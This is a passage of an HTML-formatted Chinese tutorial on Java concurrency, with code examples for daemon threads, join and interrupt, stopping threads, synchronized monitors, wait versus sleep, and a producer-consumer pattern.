    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">getStackDepth</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token function">recur</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> t<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"栈最大深度："</span> <span class="token operator">+</span> counter<span class="token punctuation">)</span><span class="token punctuation">;</span>
            t<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">TestStack</span> stack <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TestStack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        stack<span class="token punctuation">.</span><span class="token function">getStackDepth</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>


结果：<span class="token number">18368</span>  

# 查看配置
jinfo <span class="token operator">-</span>flag <span class="token class-name">ThreadStackSize</span>  <span class="token number">16320</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="守护线程">守护线程</h3>
<p>设置守护线程的方法很简单，调用<strong>setDaemon</strong>方法即可，true代表守护线程，false代表正常线程。</p>
<p>线程是否为守护线程和它的父线程有很大的关系，如果父线程是正常线程，则子线程也是正常线程，反之亦然，如果你想要修改它的特性则可以借助方法。<br>
<strong>isDaemon</strong>方法可以判断该线程是不是守护线程。</p>
<p>另外需要注意的就是，<strong>setDaemon方法只在线程启动之前才能生效</strong>，如果一个线程已经死亡，那么再设置setDaemon则会抛出<strong>IllegalThreadStateException</strong>异常。</p>
<h2 id="Chapter3：-Thread-API">Chapter3： Thread API</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token comment">// 设置线程名称</span>
<span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">void</span> <span class="token function">setPriority</span><span class="token punctuation">(</span><span class="token keyword">int</span> newPriority<span class="token punctuation">)</span> <span class="token comment">// 设置线程优先级</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h3 id="join">join()</h3>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">void</span> <span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  
<span class="token comment">// 主线程等待线程threadTest1、threadTest2执行完成</span>
<span class="token comment">// threadTest1、threadTest2 交替执行</span>
threadTest1<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
threadTest2<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>



<span class="token comment">// 以下写法，main 线程等待main 线程结束，所有程序一直处于等待状态，无法终止。</span>
<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">{</span>
  <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="interrupt">interrupt()</h3>
<p>如下方法的调用会使得当前线程进人阻塞状态，而调用当前线程的interrupt方法，就可以打断阻塞。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">)</span>、<span class="token function">sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span>、<span class="token function">wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>上述若干方法都会使得当前线程进人阻塞状态，若另外的一个线程调用被阻塞线程的<strong>interrupt</strong>方法，则会打断这种阻塞，因此这种方法有时会被称为可中断方法。</p>
<p>==打断一个线程并不等于该线程的生命周期结束，仅仅是打断了当前线程的阻塞状态==。</p>
<p>一旦线程在阻塞的情况下被打断，都会抛出一个称为<strong>InterruptedException</strong>的异常，这个异常就像一个signal（信号）一样通知当前线程被打断了。</p>
<h3 id="合理关闭一个线程">合理关闭一个线程</h3>
<ol>
<li>
<p>利用中断信号</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">{</span>
	<span class="token class-name">Thread</span> t1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token annotation punctuation">@Override</span>
		<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"I will start work."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isInterrupted</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
				<span class="token comment">// working</span>
			<span class="token punctuation">}</span>
			<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"I will be exiting."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span><span class="token punctuation">;</span>
	t1<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">MINUTES</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"System will be shutdown"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	t1<span class="token punctuation">.</span><span class="token function">interrupt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>利用Volatile开关变量控制</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">StopThread</span> <span class="token punctuation">{</span>

    <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">MyThread</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span> <span class="token punctuation">{</span>
        <span class="token keyword">private</span> <span class="token keyword">volatile</span> <span class="token keyword">boolean</span> shutdown <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>

        <span class="token annotation punctuation">@Override</span>
        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"I will start work."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>shutdown<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token comment">// working</span>
            <span class="token punctuation">}</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"I will be exiting."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">shutdown</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>shutdown <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">{</span>
        <span class="token class-name">MyThread</span> t1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        t1<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"System will be shutdown"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        t1<span class="token punctuation">.</span><span class="token function">shutdown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>耗时时间过长，强制退出线程（将执行程序设置为守护线程）</p>
<ul>
<li>使用执行线程的守护线程执行程序任务</li>
</ul>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ThreadService</span> <span class="token punctuation">{</span>
  <span class="token keyword">private</span> <span class="token class-name">Thread</span> executeThead<span class="token punctuation">;</span>

  <span class="token keyword">private</span> <span class="token keyword">boolean</span> finished <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>

  <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">execute</span><span class="token punctuation">(</span><span class="token class-name">Runnable</span> task<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    executeThead <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token annotation punctuation">@Override</span>
      <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">Thread</span> runner <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>task<span class="token punctuation">)</span><span class="token punctuation">;</span>
        runner<span class="token punctuation">.</span><span class="token function">setDaemon</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        runner<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
          <span class="token comment">// 等待runner执行完成</span>
          runner<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          finished <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
          <span class="token comment">// 执行被打断</span>
          <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"执行任务的守护线程被打断"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
    executeThead<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">shutdown</span><span class="token punctuation">(</span><span class="token keyword">long</span> miles<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">long</span> currentTime <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>finished<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> currentTime <span class="token operator">&gt;=</span> miles<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"执行任务超时"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        executeThead<span class="token punctuation">.</span><span class="token function">interrupt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>

      <span class="token keyword">try</span> <span class="token punctuation">{</span>
        <span class="token comment">// 短暂休眠，减少执行次数</span>
        <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"执行线程被打断"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>调用执行线程</li>
</ul>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ThreadCloseForce</span> <span class="token punctuation">{</span>
  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token class-name">ThreadService</span> threadService <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ThreadService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">long</span> start <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 启动执行线程</span>
    threadService<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
      <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// 模拟线程阻塞</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 超时验证</span>
    threadService<span class="token punctuation">.</span><span class="token function">shutdown</span><span class="token punctuation">(</span><span class="token number">10_000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">long</span> end <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>end <span class="token operator">-</span> start<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>执行结果</li>
</ul>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">执行任务超时
10117
执行任务的守护线程被打断
java.lang.InterruptedException
	at java.lang.Object.wait(Native Method)
	at java.lang.Thread.join(Thread.java:1252)
	at java.lang.Thread.join(Thread.java:1326)
	at com.hots.part1.chapter3.ThreadService$1.run(ThreadService.java:16)

Process finished with exit code 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ol>
<h2 id="Chapter4：线程安全与数据同步">Chapter4：线程安全与数据同步</h2>
<h3 id="synchronized关键字">synchronized关键字</h3>
<blockquote>
<p>使用synchronized需要注意的问题</p>
<ol>
<li>
<p>与monitor关联的对象不可为空</p>
</li>
<li>
<p>synchronized的作用域不可太大（降低执行效率）</p>
</li>
<li>
<p>不同的monitor企图锁住相同的方法</p>
</li>
<li>
<p>多个锁导致死锁</p>
</li>
</ol>
</blockquote>
<h3 id="this-monitor-和-class-monitor"><code>this</code> monitor 和 <code>class</code> monitor</h3>
<ol>
<li>
<p>使用synchronized同步一个类的不同方法，争抢的是同一个锁（方法所属的对象的锁）：synchronied(this)</p>
<p>官方说明：</p>
<pre class="line-numbers language-none"><code class="language-none">When a thread invokes a synchronized method, it automatically acquires the intrinsic lock for that method's object and releases it when the method returns. 

The lock release occurs even if the return vas caused by an uncaught exception.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>使用synchronized同步一个类的不同静态方法，争抢的是同一个锁（类的<strong>class锁</strong>）：synchronied(Test.class)</p>
<p>官方说明：</p>
<pre class="line-numbers language-none"><code class="language-none">since a static method is associated with a class, not an object.
In this case, the thread acquires the intrinsic lock for the Class object associated with the class. 
Thus access to class'S static fields is controlled by a lock that's distinct from the lock for any instance of the class.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
</ol>
<h2 id="Chapter5：线程之间的通信">Chapter5：线程之间的通信</h2>
<p>wait 、notify、notifyAll</p>
<h3 id="wait-和-sleep和区别">wait 和 sleep和区别</h3>
<p>从表面上看，wait和sleep方法都可以使当前线程进人阻塞状态，但是两者之间存在着本质的区别，下面我们将总结两者的区别和相似之处</p>
<ul>
<li>wait和sleep方法都可以使线程进人阻塞状态</li>
<li>wait和sleep方法均是可中断方法，被中断后都会收到中断异常。</li>
<li><strong>wait是Object的方法，而sleep是Thread特有的方法</strong></li>
<li>wait方法的执行必须在同步方法中进行，而sleep则不需要。</li>
<li>线程在同步方法中执行sleep方法时，并不会释放的锁，而wait方法则会释放monitor的锁</li>
<li>sleep方法短暂休眠之后会主动退出阻塞，而wait方法（没有指定wait时间）则需要被其他线程中断后才能退出阻塞。</li>
</ul>
<h3 id="单线程通信">单线程通信</h3>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ProducerAndConsumerVersion1</span> <span class="token punctuation">{</span>

    <span class="token keyword">private</span> <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token keyword">volatile</span> <span class="token keyword">boolean</span> isProduced <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">Object</span> <span class="token constant">LOCK</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">produce</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">synchronized</span> <span class="token punctuation">(</span><span class="token constant">LOCK</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>isProduced<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">try</span> <span class="token punctuation">{</span>
                    <span class="token constant">LOCK</span><span class="token punctuation">.</span><span class="token function">wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token operator">++</span>i<span class="token punctuation">;</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"：produced-&gt;"</span> <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token constant">LOCK</span><span class="token punctuation">.</span><span class="token function">notify</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                isProduced <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">consume</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">synchronized</span> <span class="token punctuation">(</span><span class="token constant">LOCK</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>isProduced<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"：consumed-&gt;"</span> <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token constant">LOCK</span><span class="token punctuation">.</span><span class="token function">notify</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                isProduced <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token keyword">try</span> <span class="token punctuation">{</span>
                    <span class="token constant">LOCK</span><span class="token punctuation">.</span><span class="token function">wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">ProducerAndConsumerVersion1</span> producerAndConsumerVersion1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ProducerAndConsumerVersion1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token string">"P1"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token annotation punctuation">@Override</span>
            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    producerAndConsumerVersion1<span class="token punctuation">.</span><span class="token function">produce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token string">"C1"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token annotation punctuation">@Override</span>
            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    producerAndConsumerVersion1<span class="token punctuation">.</span><span class="token function">consume</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
